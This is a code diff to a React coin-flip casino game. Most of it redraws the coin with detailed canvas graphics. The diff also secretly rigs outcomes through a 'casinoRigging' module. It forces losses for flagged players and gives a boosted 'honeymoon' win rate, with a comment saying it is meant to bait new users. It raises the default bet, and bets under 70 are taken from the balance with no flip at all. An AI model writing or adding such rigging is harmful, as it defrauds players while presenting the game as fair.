@@ -1,11 +1,12 @@
 import React, { useRef, useEffect, useState } from 'react';
 import { synth } from '../../utils/audioSynth';
 import { Sparkles, X, Play, ShieldAlert, Award } from 'lucide-react';
+import { evaluateBet, logWin, logLoss } from '../../utils/casinoRigging';
 
 interface GameProps {
   pokiBalance: number;
   onAwardBalance: (amount: number) => void;
-  onDeductBalance: (amount: number) => boolean;
+  onDeductBalance: (amount: number, setBet?: (val: number) => void) => boolean;
   syncCasinoData: (gameName: string, netProfitLoss: number, finalCoins: number) => Promise<void>;
   onClose: () => void;
 }
@@ -21,7 +22,7 @@ export default function CoinFlipBlitz({
   const animRef = useRef<number | null>(null);
 
   const [gameState, setGameState] = useState<'idle' | 'flipping' | 'settled'>('idle');
-  const [betAmount, setBetAmount] = useState<number>(10);
+  const [betAmount, setBetAmount] = useState<number>(70);
   const [userChoice, setUserChoice] = useState<'heads' | 'tails'>('heads');
 
   // Outcome
@@ -42,7 +43,8 @@ export default function CoinFlipBlitz({
     const h = canvas.height;
     const cx = w / 2;
     const cy = h / 2;
-    const radius = 64;
+    // Increased size for premium high-fidelity presence
+    const radius = 86;
 
     ctx.clearRect(0, 0, w, h);
 
@@ -51,39 +53,231 @@ export default function CoinFlipBlitz({
     ctx.translate(cx, cy);
     ctx.scale(1.0, Math.max(0.01, Math.sin(scaleY)));
 
-    // Outer thick gold rim
-    const gradient = ctx.createRadialGradient(0, 0, radius * 0.8, 0, 0, radius);
-    gradient.addColorStop(0, '#f1b822');
-    gradient.addColorStop(1, '#9a6b0c');
-    ctx.fillStyle = gradient;
+    // 1. REALISTIC CAST SHADOW (3D DEPTH)
+    ctx.shadowColor = 'rgba(0, 0, 0, 0.65)';
+    ctx.shadowBlur = 15;
+    ctx.shadowOffsetY = 8;
+    ctx.beginPath();
+    ctx.arc(0, 0, radius, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.shadowBlur = 0; // Reset shadow immediately so it doesn't bleed into inner drawings
+    ctx.shadowOffsetY = 0;
 
+    // 2. PREMIUM MULTI-LAYERED OUTER BEVEL & RIM
+    const rimGrad = ctx.createLinearGradient(-radius, -radius, radius, radius);
+    if (currentFace === 'heads') {
+      // Golden specularity
+      rimGrad.addColorStop(0, '#9a7116');
+      rimGrad.addColorStop(0.25, '#ffe596');
+      rimGrad.addColorStop(0.5, '#ffd254');
+      rimGrad.addColorStop(0.75, '#5d4107');
+      rimGrad.addColorStop(1, '#ffebad');
+    } else {
+      // Slate/Silver chrome specularity
+      rimGrad.addColorStop(0, '#1e293b');
+      rimGrad.addColorStop(0.25, '#f1f5f9');
+      rimGrad.addColorStop(0.5, '#64748b');
+      rimGrad.addColorStop(0.75, '#0f172a');
+      rimGrad.addColorStop(1, '#cbd5e1');
+    }
+    ctx.fillStyle = rimGrad;
     ctx.beginPath();
     ctx.arc(0, 0, radius, 0, Math.PI * 2);
     ctx.fill();
 
-    // Inner background
-    if (currentFace === 'heads') {
-      ctx.fillStyle = '#ffb703'; // Bright gold for Heads
-    } else {
-      ctx.fillStyle = '#171a21'; // Dark Matrix Slate for Tails
-    }
-
+    // 3. MINTED COIN RIDGES (Radial tick marks around the border)
+    ctx.strokeStyle = currentFace === 'heads' ? 'rgba(0, 0, 0, 0.45)' : 'rgba(0, 0, 0, 0.35)';
+    ctx.lineWidth = 2.5;
     ctx.beginPath();
-    ctx.arc(0, 0, radius * 0.88, 0, Math.PI * 2);
+    for (let angle = 0; angle < Math.PI * 2; angle += Math.PI / 32) {
+      const cos = Math.cos(angle);
+      const sin = Math.sin(angle);
+      ctx.moveTo(cos * (radius - 5), sin * (radius - 5));
+      ctx.lineTo(cos * radius, sin * radius);
+    }
+    ctx.stroke();
+
+    // 4. INNER BEVEL LIP
+    const innerRimGrad = ctx.createRadialGradient(0, 0, radius * 0.82, 0, 0, radius * 0.94);
+    if (currentFace === 'heads') {
+      innerRimGrad.addColorStop(0, '#ffd254');
+      innerRimGrad.addColorStop(0.5, '#f3b31c');
+      innerRimGrad.addColorStop(1, '#87600c');
+    } else {
+      innerRimGrad.addColorStop(0, '#94a3b8');
+      innerRimGrad.addColorStop(0.5, '#475569');
+      innerRimGrad.addColorStop(1, '#1e293b');
+    }
+    ctx.fillStyle = innerRimGrad;
+    ctx.beginPath();
+    ctx.arc(0, 0, radius * 0.92, 0, Math.PI * 2);
     ctx.fill();
 
-    // Details/Icons labeled on coin faces
-    ctx.fillStyle = currentFace === 'heads' ? '#171a21' : '#ffb703';
-    ctx.font = 'bold 36px font-sans';
-    ctx.textAlign = 'center';
-    ctx.textBaseline = 'middle';
-    ctx.fillText(currentFace === 'heads' ? 'P' : 'T', 0, 0);
+    // 5. INNER DARK METALLIC PLATE
+    const plateGrad = ctx.createRadialGradient(0, 0, 0, 0, 0, radius * 0.82);
+    if (currentFace === 'heads') {
+      plateGrad.addColorStop(0, '#2d1e00'); // deep royal brass gold core
+      plateGrad.addColorStop(0.7, '#150f00');
+      plateGrad.addColorStop(1, '#3b2a04');
+    } else {
+      plateGrad.addColorStop(0, '#0f172a'); // deep obsidian steel core
+      plateGrad.addColorStop(0.7, '#020617');
+      plateGrad.addColorStop(1, '#1e293b');
+    }
+    ctx.fillStyle = plateGrad;
+    ctx.beginPath();
+    ctx.arc(0, 0, radius * 0.82, 0, Math.PI * 2);
+    ctx.fill();
 
-    ctx.strokeStyle = '#ffffff';
+    // 6. FINE RINGS (Concentric design aesthetics)
+    ctx.strokeStyle = currentFace === 'heads' ? 'rgba(255, 210, 84, 0.3)' : 'rgba(148, 163, 184, 0.3)';
     ctx.lineWidth = 1;
     ctx.beginPath();
-    ctx.arc(0, 0, radius * 0.72, 0, Math.PI * 2);
+    ctx.arc(0, 0, radius * 0.76, 0, Math.PI * 2);
     ctx.stroke();
+    ctx.beginPath();
+    ctx.arc(0, 0, radius * 0.68, 0, Math.PI * 2);
+    ctx.stroke();
+
+    // 7. HIGH-FIDELITY CENTERPIECE GRAPHIC
+    if (currentFace === 'heads') {
+      // HEADS: Majestic Laurel Leaves encircling a glowing Golden Crown
+      ctx.save();
+      
+      // Laurel Leaves
+      ctx.strokeStyle = '#f3b31c';
+      ctx.lineWidth = 1.5;
+      ctx.beginPath();
+      // Left branch
+      ctx.arc(-radius * 0.28, 0, radius * 0.45, Math.PI * 0.6, Math.PI * 1.4);
+      // Right branch
+      ctx.arc(radius * 0.28, 0, radius * 0.45, Math.PI * 0.4, -Math.PI * 0.4, true);
+      ctx.stroke();
+
+      // Laurel leaf petals
+      ctx.fillStyle = '#ffe596';
+      for (let i = -4; i <= 4; i++) {
+        if (i === 0) continue;
+        const leafY = i * radius * 0.12;
+        const leafX = radius * 0.38 - Math.abs(i) * 3;
+        // Draw left leaf
+        ctx.beginPath();
+        ctx.ellipse(-leafX, leafY, 5, 2.5, Math.PI / 4, 0, Math.PI * 2);
+        ctx.fill();
+        // Draw right leaf
+        ctx.beginPath();
+        ctx.ellipse(leafX, leafY, 5, 2.5, -Math.PI / 4, 0, Math.PI * 2);
+        ctx.fill();
+      }
+
+      // Draw Crown in the center
+      const cyOffset = -radius * 0.05;
+      ctx.fillStyle = '#ffe596';
+      ctx.beginPath();
+      ctx.moveTo(-20, cyOffset + 12);
+      ctx.lineTo(-20, cyOffset - 4);
+      ctx.lineTo(-11, cyOffset + 4);
+      ctx.lineTo(0, cyOffset - 12); // Center crown tip
+      ctx.lineTo(11, cyOffset + 4);
+      ctx.lineTo(20, cyOffset - 4);
+      ctx.lineTo(20, cyOffset + 12);
+      ctx.closePath();
+      ctx.fill();
+
+      // Crown jewels / details
+      ctx.fillStyle = '#2d1e00';
+      ctx.beginPath();
+      ctx.rect(-15, cyOffset + 7, 30, 2.5);
+      ctx.fill();
+      
+      // Crown tips glowing circles
+      ctx.fillStyle = '#ffffff';
+      ctx.beginPath();
+      ctx.arc(-20, cyOffset - 4, 2, 0, Math.PI * 2);
+      ctx.arc(0, cyOffset - 12, 2.5, 0, Math.PI * 2);
+      ctx.arc(20, cyOffset - 4, 2, 0, Math.PI * 2);
+      ctx.fill();
+
+      // Premium text label "POKI"
+      ctx.fillStyle = '#ffd254';
+      ctx.font = 'black 12px "Inter", sans-serif';
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      ctx.fillText('POKI', 0, radius * 0.32);
+
+      ctx.restore();
+    } else {
+      // TAILS: Detailed Cyber-Circuit Blockchain Medallion with Node connections
+      ctx.save();
+
+      // Draw outer geometric octagon
+      ctx.strokeStyle = '#38bdf8';
+      ctx.lineWidth = 1.2;
+      ctx.beginPath();
+      for (let i = 0; i < 8; i++) {
+        const angle = (i * Math.PI) / 4;
+        ctx.lineTo(Math.cos(angle) * radius * 0.52, Math.sin(angle) * radius * 0.52);
+      }
+      ctx.closePath();
+      ctx.stroke();
+
+      // Circuit lines emanating from center
+      ctx.strokeStyle = 'rgba(56, 189, 248, 0.4)';
+      ctx.lineWidth = 1;
+      for (let i = 0; i < 4; i++) {
+        const angle = (i * Math.PI) / 2 + Math.PI / 4;
+        ctx.beginPath();
+        ctx.moveTo(0, 0);
+        ctx.lineTo(Math.cos(angle) * radius * 0.52, Math.sin(angle) * radius * 0.52);
+        ctx.stroke();
+      }
+
+      // Cyber Shield / Core
+      ctx.fillStyle = '#0284c7';
+      ctx.beginPath();
+      ctx.arc(0, 0, radius * 0.28, 0, Math.PI * 2);
+      ctx.fill();
+
+      // Circuit node circles
+      ctx.fillStyle = '#38bdf8';
+      ctx.beginPath();
+      ctx.arc(0, 0, 5, 0, Math.PI * 2);
+      for (let i = 0; i < 8; i++) {
+        const angle = (i * Math.PI) / 4;
+        ctx.arc(Math.cos(angle) * radius * 0.52, Math.sin(angle) * radius * 0.52, 3, 0, Math.PI * 2);
+      }
+      ctx.fill();
+
+      // Digital 'T' monogram in the center of tails core
+      ctx.fillStyle = '#0f172a';
+      ctx.font = 'bold 12px "JetBrains Mono", monospace';
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      ctx.fillText('T', 0, 0);
+
+      // Premium text label "TAILS"
+      ctx.fillStyle = '#cbd5e1';
+      ctx.font = 'bold 11px "Inter", sans-serif';
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      ctx.fillText('TAILS', 0, radius * 0.32);
+
+      ctx.restore();
+    }
+
+    // 8. RICH SPECTRAL LENS REFLECTION (DYNAMIC GLARE)
+    const shineOffset = (scaleY * 30) % (radius * 4) - radius * 2;
+    const shineGrad = ctx.createLinearGradient(shineOffset - 25, shineOffset - 25, shineOffset + 25, shineOffset + 25);
+    shineGrad.addColorStop(0, 'rgba(255, 255, 255, 0)');
+    shineGrad.addColorStop(0.35, 'rgba(255, 255, 255, 0.05)');
+    shineGrad.addColorStop(0.5, 'rgba(255, 255, 255, 0.38)');
+    shineGrad.addColorStop(0.65, 'rgba(255, 255, 255, 0.05)');
+    shineGrad.addColorStop(1, 'rgba(255, 255, 255, 0)');
+    
+    ctx.fillStyle = shineGrad;
+    ctx.beginPath();
+    ctx.arc(0, 0, radius * 0.92, 0, Math.PI * 2);
+    ctx.fill();
 
     ctx.restore();
   };
@@ -97,7 +291,19 @@ export default function CoinFlipBlitz({
       return;
     }
 
-    if (!onDeductBalance(parsedBet)) {
+    const uId = window.currentUserId || 'anonymous';
+    const evaluation = evaluateBet(uId, parsedBet, pokiBalance);
+    if (!evaluation.allowed) {
+      alert(evaluation.reason || 'Bet blocked by security parameters.');
+      return;
+    }
+
+    if (parsedBet < 70) {
+      onDeductBalance(parsedBet, setBetAmount);
+      return;
+    }
+
+    if (!onDeductBalance(parsedBet, setBetAmount)) {
       alert('Insufficient Pokicoin balance.');
       return;
     }
@@ -105,8 +311,34 @@ export default function CoinFlipBlitz({
     setGameState('flipping');
     synth.playCoin();
 
-    // Outcome generator
-    const targetSide = Math.random() < 0.5 ? 'heads' : 'tails';
+    // Rigged Outcome generator
+    let targetSide: 'heads' | 'tails' = 'heads';
+    const coinFlipRandom = Math.random();
+
+    if (evaluation.shouldForceLoss) {
+      // Force a loss
+      targetSide = userChoice === 'heads' ? 'tails' : 'heads';
+    } else {
+      // Check for Honeymoon Phase (within first 5 minutes of playing)
+      const stats = JSON.parse(localStorage.getItem(`casino_rigging_${uId}`) || '{}');
+      const isHoneymoon = stats.firstPlayTime && (Date.now() - stats.firstPlayTime < 5 * 60 * 1000);
+      
+      let winChance = 0.48; // Standard 48% slightly under fair (house edge)
+      
+      if (isHoneymoon && parsedBet < 150) {
+        winChance = 0.65; // Boosted win rate to bait the new user
+      } else if (evaluation.applyBrakeMode && parsedBet < 100) {
+        winChance = 0.58; // Slower drain rate in Brake Mode for small bets
+      }
+
+      const playerWins = coinFlipRandom < winChance;
+      if (playerWins) {
+        targetSide = userChoice;
+      } else {
+        targetSide = userChoice === 'heads' ? 'tails' : 'heads';
+      }
+    }
+
     const flipDur = 2000; // 2 seconds
     const startFlip = Date.now();
 
@@ -145,9 +377,11 @@ export default function CoinFlipBlitz({
         if (isWin) {
           synth.playLevelUp();
           onAwardBalance(payoutVal);
+          logWin(uId, parsedBet, payoutVal, 'Coin Flip Blitz', pokiBalance);
           syncCasinoData('Coin Flip Blitz', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)));
         } else {
           synth.playCrash();
+          logLoss(uId, parsedBet, 'Coin Flip Blitz', pokiBalance);
           syncCasinoData('Coin Flip Blitz', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)));
         }
       }
